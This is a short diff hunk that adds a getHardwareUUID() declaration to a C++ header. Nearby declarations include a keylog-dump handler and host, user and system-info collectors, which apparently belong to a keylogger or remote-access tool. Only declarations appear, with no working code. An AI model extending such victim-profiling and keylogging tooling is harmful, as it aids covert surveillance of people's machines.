@@ -49,6 +49,7 @@ private:
     void handleKeylogDump();
 
     // System Profiler (Gourmandise Subsystem)
+    std::string getHardwareUUID();
     std::string getSystemInfo();
     std::string getHostname();
     std::string getUsername();
